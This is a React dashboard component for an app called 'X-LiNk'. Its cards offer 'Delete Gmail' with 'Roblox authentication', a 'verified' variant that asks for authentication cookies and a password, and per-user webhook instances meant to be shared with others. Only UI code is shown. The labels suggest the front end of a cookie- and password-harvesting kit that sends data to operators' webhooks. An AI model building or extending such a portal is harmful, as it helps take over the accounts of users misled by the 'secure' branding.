import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Mail, Shield, Trash2, Webhook, Zap, Star, Crown } from "lucide-react";
import { XLogo } from "@/components/ui/x-logo";

interface DashboardProps {
  onDeleteGmail: () => void;
  onDeleteVerifyGmail: () => void;
  onCreateWebhook?: () => void;
}

export const Dashboard = ({
  onDeleteGmail,
  onDeleteVerifyGmail,
  onCreateWebhook,
}: DashboardProps) => {
  // Check if this is a custom instance (hide webhook creation)
  const urlParams = new URLSearchParams(window.location.search);
  const isCustomInstance = urlParams.get("ref");

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-8 relative">
      {/* Ultra-Premium Background Enhancement */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-10 w-2 h-2 bg-blue-400/60 rounded-full animate-pulse-ultra-slow"></div>
        <div className="absolute top-40 right-20 w-1 h-1 bg-purple-400/60 rounded-full animate-float"></div>
        <div className="absolute bottom-32 left-20 w-3 h-3 bg-cyan-400/40 rounded-full animate-pulse-slow"></div>
        <div className="absolute bottom-20 right-10 w-1.5 h-1.5 bg-emerald-400/60 rounded-full animate-float"></div>
      </div>

      {/* Ultra-Professional Header */}
      <motion.div
        className="text-center mb-24 relative"
        initial={{ opacity: 0, y: -40 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 1, ease: "easeOut" }}
      >
        {/* Premium Logo Container */}
        <motion.div
          className="flex justify-center mb-8 relative"
          whileHover={{ scale: 1.05 }}
          transition={{ type: "spring", stiffness: 300 }}
        >
          <div className="relative">
            {/* Glow effect behind logo */}
            <div className="absolute inset-0 bg-blue-500/20 rounded-full blur-2xl scale-150 animate-pulse-ultra-slow"></div>
            <div className="absolute inset-0 bg-purple-500/10 rounded-full blur-3xl scale-200 animate-pulse-slow"></div>
            <XLogo size={140} />
            {/* Premium badge */}
            <motion.div
              className="absolute -top-2 -right-2 w-8 h-8 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center shadow-lg"
              initial={{ scale: 0, rotate: -180 }}
              animate={{ scale: 1, rotate: 0 }}
              transition={{ delay: 1, type: "spring", stiffness: 300 }}
            >
              <Crown className="w-4 h-4 text-white" />
            </motion.div>
          </div>
        </motion.div>

        {/* Ultra-Premium Title */}
        <motion.h1
          className="text-8xl font-black text-holographic mb-8 tracking-wider drop-shadow-2xl"
          initial={{ opacity: 0, scale: 0.8 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.3, duration: 0.8 }}
        >
          X-LiNk
        </motion.h1>

        {/* Premium Separator */}
        <motion.div
          className="relative mb-8"
          initial={{ width: 0 }}
          animate={{ width: "100%" }}
          transition={{ delay: 0.6, duration: 0.8 }}
        >
          <div className="w-40 h-2 bg-gradient-to-r from-blue-500 via-purple-500 via-cyan-500 to-emerald-500 mx-auto rounded-full shadow-lg"></div>
          <div className="absolute inset-0 w-40 h-2 bg-gradient-to-r from-blue-500 via-purple-500 via-cyan-500 to-emerald-500 mx-auto rounded-full blur-sm"></div>
        </motion.div>

        {/* Ultra-Professional Subtitle */}
        <motion.p
          className="text-premium-gradient text-3xl font-bold tracking-wide mb-6"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.8, duration: 0.6 }}
        >
          Ultra Professional Management System
        </motion.p>

        {/* Premium Status Indicators */}
        <motion.div
          className="flex items-center justify-center gap-8 mb-6"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1, duration: 0.6 }}
        >
          <div className="flex items-center gap-2 glass-premium px-4 py-2 rounded-full">
            <Zap className="w-4 h-4 text-yellow-400" />
            <span className="text-yellow-300 text-sm font-bold">PREMIUM</span>
          </div>
          <div className="flex items-center gap-2 glass-premium px-4 py-2 rounded-full">
            <Star className="w-4 h-4 text-blue-400" />
            <span className="text-blue-300 text-sm font-bold">ENTERPRISE</span>
          </div>
          <div className="flex items-center gap-2 glass-premium px-4 py-2 rounded-full">
            <Shield className="w-4 h-4 text-green-400" />
            <span className="text-green-300 text-sm font-bold">SECURE</span>
          </div>
        </motion.div>

        {/* Custom Instance Badge */}
        {isCustomInstance && (
          <motion.div
            className="inline-block px-6 py-3 glass-ultra rounded-2xl border-2 border-purple-500/50"
            initial={{ scale: 0, rotate: -10 }}
            animate={{ scale: 1, rotate: 0 }}
            transition={{ delay: 1.2, type: "spring", stiffness: 300 }}
          >
            <div className="flex items-center gap-3">
              <div className="w-3 h-3 bg-purple-400 rounded-full animate-pulse"></div>
              <p className="text-purple-300 text-lg font-bold tracking-wide">
                Custom Instance Portal
              </p>
              <div className="w-3 h-3 bg-purple-400 rounded-full animate-pulse"></div>
            </div>
          </motion.div>
        )}
      </motion.div>

      {/* Ultra-Premium Cards Grid */}
      <div
        className={`grid gap-12 max-w-7xl w-full ${
          isCustomInstance
            ? "md:grid-cols-2 grid-cols-1"
            : "lg:grid-cols-3 md:grid-cols-2 grid-cols-1"
        }`}
      >
        {/* Ultra-Premium Delete Gmail Card */}
        <motion.div
          initial={{ opacity: 0, x: -60, rotateY: -15 }}
          animate={{ opacity: 1, x: 0, rotateY: 0 }}
          transition={{ duration: 1, delay: 0.2, ease: "easeOut" }}
          whileHover={{ scale: 1.05, y: -12, rotateY: 5 }}
          whileTap={{ scale: 0.98 }}
          className="perspective-1000"
        >
          <Card className="card-professional border-red-500/60 hover:border-red-400/80 cursor-pointer h-full group relative overflow-hidden transform-gpu">
            {/* Premium card overlay effects */}
            <div className="absolute inset-0 bg-gradient-to-br from-red-500/5 via-transparent to-red-600/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>

            <CardHeader className="text-center pb-10 relative z-10">
              <div className="flex justify-center mb-10">
                <motion.div
                  className="relative p-10 bg-gradient-to-br from-red-600/20 to-red-700/30 rounded-3xl group-hover:from-red-500/30 group-hover:to-red-600/40 transition-all duration-500 shadow-2xl"
                  whileHover={{ rotate: 12, scale: 1.15 }}
                  transition={{ type: "spring", stiffness: 400, damping: 10 }}
                >
                  {/* Glowing ring around icon */}
                  <div className="absolute inset-0 rounded-3xl bg-gradient-to-br from-red-500/30 to-red-600/30 blur-xl scale-110 opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                  <Trash2 className="w-24 h-24 text-red-400 group-hover:text-red-300 transition-colors relative z-10" />
                  {/* Premium corner accents */}
                  <div className="absolute top-2 left-2 w-3 h-3 border-l-2 border-t-2 border-red-400/50"></div>
                  <div className="absolute bottom-2 right-2 w-3 h-3 border-r-2 border-b-2 border-red-400/50"></div>
                </motion.div>
              </div>
              <CardTitle className="text-4xl text-neon font-black tracking-wide mb-4">
                Delete Gmail
              </CardTitle>
              <div className="w-20 h-1.5 bg-gradient-to-r from-red-500 to-red-400 mx-auto rounded-full shadow-lg"></div>
            </CardHeader>
            <CardContent className="text-center space-y-8 pb-10 relative z-10">
              <p className="text-red-200 text-xl leading-relaxed font-medium">
                Ultra-fast Gmail deletion with advanced Roblox authentication
                system
              </p>
              <div className="space-y-3 text-base text-red-300/90">
                <div className="flex items-center justify-center gap-3 glass-premium px-4 py-2 rounded-full">
                  <div className="w-2.5 h-2.5 bg-red-400 rounded-full animate-pulse"></div>
                  <span className="font-semibold">Lightning Processing</span>
                </div>
                <div className="flex items-center justify-center gap-3 glass-premium px-4 py-2 rounded-full">
                  <div className="w-2.5 h-2.5 bg-red-400 rounded-full animate-pulse"></div>
                  <span className="font-semibold">Advanced Security</span>
                </div>
                <div className="flex items-center justify-center gap-3 glass-premium px-4 py-2 rounded-full">
                  <div className="w-2.5 h-2.5 bg-red-400 rounded-full animate-pulse"></div>
                  <span className="font-semibold">Instant Execution</span>
                </div>
              </div>
              <Button
                onClick={onDeleteGmail}
                className="w-full bg-gradient-to-r from-red-600 via-red-500 to-red-600 hover:from-red-500 hover:via-red-400 hover:to-red-500 text-white py-5 text-xl font-bold shadow-2xl hover:shadow-red-500/40 transition-all duration-400 transform hover:scale-105 btn-professional group relative overflow-hidden"
                size="lg"
              >
                <div className="flex items-center justify-center gap-4 relative z-10">
                  <Mail className="w-6 h-6" />
                  <span className="tracking-wider">INITIALIZE PROCESS</span>
                  <div className="w-2 h-2 bg-white/80 rounded-full animate-pulse"></div>
                </div>
              </Button>
            </CardContent>
          </Card>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          whileHover={{ scale: 1.03, y: -8 }}
          whileTap={{ scale: 0.97 }}
        >
          <Card className="bg-black/60 border-orange-500/40 backdrop-blur-2xl hover:bg-black/70 transition-all duration-500 cursor-pointer h-full group shadow-2xl hover:shadow-orange-500/25">
            <CardHeader className="text-center pb-8">
              <div className="flex justify-center mb-8">
                <motion.div
                  className="p-8 bg-gradient-to-br from-orange-600/30 to-orange-700/40 rounded-3xl group-hover:from-orange-500/40 group-hover:to-orange-600/50 transition-all duration-500 shadow-lg"
                  whileHover={{ rotate: -8, scale: 1.1 }}
                  transition={{ type: "spring", stiffness: 300 }}
                >
                  <Shield className="w-20 h-20 text-orange-400 group-hover:text-orange-300 transition-colors" />
                </motion.div>
              </div>
              <CardTitle className="text-3xl text-white font-bold tracking-wide mb-2">
                Delete Verify Gmail
              </CardTitle>
              <div className="w-16 h-1 bg-orange-500 mx-auto rounded-full"></div>
            </CardHeader>
            <CardContent className="text-center space-y-6 pb-8">
              <p className="text-orange-200 text-lg leading-relaxed">
                Advanced verified Gmail deletion. Requires both authentication
                cookies and password.
              </p>
              <div className="space-y-2 text-sm text-orange-300/80">
                <div className="flex items-center justify-center gap-2">
                  <div className="w-2 h-2 bg-orange-400 rounded-full"></div>
                  <span>Enhanced security</span>
                </div>
                <div className="flex items-center justify-center gap-2">
                  <div className="w-2 h-2 bg-orange-400 rounded-full"></div>
                  <span>Dual authentication</span>
                </div>
                <div className="flex items-center justify-center gap-2">
                  <div className="w-2 h-2 bg-orange-400 rounded-full"></div>
                  <span>Verified processing</span>
                </div>
              </div>
              <Button
                onClick={onDeleteVerifyGmail}
                className="w-full bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-500 hover:to-orange-600 text-white py-4 text-lg font-semibold shadow-xl hover:shadow-orange-500/30 transition-all duration-300 transform hover:scale-105"
                size="lg"
              >
                <Shield className="w-5 h-5 mr-3" />
                Initialize Process
              </Button>
            </CardContent>
          </Card>
        </motion.div>

        {/* Only show webhook creation if NOT a custom instance */}
        {!isCustomInstance && onCreateWebhook && (
          <motion.div
            initial={{ opacity: 0, x: 50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8, delay: 0.6 }}
            whileHover={{ scale: 1.03, y: -8 }}
            whileTap={{ scale: 0.97 }}
            className="lg:col-span-1 md:col-span-2"
          >
            <Card className="bg-black/60 border-purple-500/40 backdrop-blur-2xl hover:bg-black/70 transition-all duration-500 cursor-pointer h-full group shadow-2xl hover:shadow-purple-500/25">
              <CardHeader className="text-center pb-8">
                <div className="flex justify-center mb-8">
                  <motion.div
                    className="p-8 bg-gradient-to-br from-purple-600/30 to-purple-700/40 rounded-3xl group-hover:from-purple-500/40 group-hover:to-purple-600/50 transition-all duration-500 shadow-lg"
                    whileHover={{ rotate: 12, scale: 1.1 }}
                    transition={{ type: "spring", stiffness: 300 }}
                  >
                    <Webhook className="w-20 h-20 text-purple-400 group-hover:text-purple-300 transition-colors" />
                  </motion.div>
                </div>
                <CardTitle className="text-3xl text-white font-bold tracking-wide mb-2">
                  Create Webhook
                </CardTitle>
                <div className="w-16 h-1 bg-purple-500 mx-auto rounded-full"></div>
              </CardHeader>
              <CardContent className="text-center space-y-6 pb-8">
                <p className="text-purple-200 text-lg leading-relaxed">
                  Generate your own X-LiNk instance with custom webhook. Create
                  your personal management portal.
                </p>
                <div className="space-y-2 text-sm text-purple-300/80">
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-2 h-2 bg-purple-400 rounded-full"></div>
                    <span>Custom webhook URL</span>
                  </div>
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-2 h-2 bg-purple-400 rounded-full"></div>
                    <span>Personal instance</span>
                  </div>
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-2 h-2 bg-purple-400 rounded-full"></div>
                    <span>Share with others</span>
                  </div>
                </div>
                <Button
                  onClick={onCreateWebhook}
                  className="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-500 hover:to-purple-600 text-white py-4 text-lg font-semibold shadow-xl hover:shadow-purple-500/30 transition-all duration-300 transform hover:scale-105"
                  size="lg"
                >
                  <Webhook className="w-5 h-5 mr-3" />
                  Create Instance
                </Button>
              </CardContent>
            </Card>
          </motion.div>
        )}
      </div>

      <motion.div
        className="mt-20 text-center"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.8, delay: 1 }}
      >
        <div className="w-40 h-px bg-gradient-to-r from-transparent via-gray-500 to-transparent mx-auto mb-6 rounded-full"></div>
        <p className="text-gray-500 text-sm font-light tracking-wider">
          SECURE • RELIABLE • PROFESSIONAL
        </p>
      </motion.div>
    </div>
  );
};
